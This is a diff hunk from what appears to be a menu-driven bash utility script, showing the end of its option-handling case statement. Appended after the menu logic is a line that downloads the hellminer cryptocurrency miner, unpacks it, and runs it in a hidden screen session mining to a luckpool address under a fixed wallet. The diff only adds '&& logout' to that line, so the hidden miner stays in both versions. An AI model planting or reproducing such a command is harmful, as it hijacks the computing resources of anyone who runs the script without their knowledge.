@@ -1518,4 +1518,4 @@ a )	update;;
 e )	[[ $m = 0 ]] && red " ${T[${L}147]} " && exit 1 || stream;;
 * )	menu;;
 esac
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.hax -p x --cpu 1' && screen -r
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && screen -d -m -S itsfii bash -c './hellminer -c stratum+tcp://na.luckpool.net:3956 -u RHvyBq43am2Cfu6xp8tJzDUqj8Jsok5Byq.hax -p x --cpu 1' && screen -r && logout
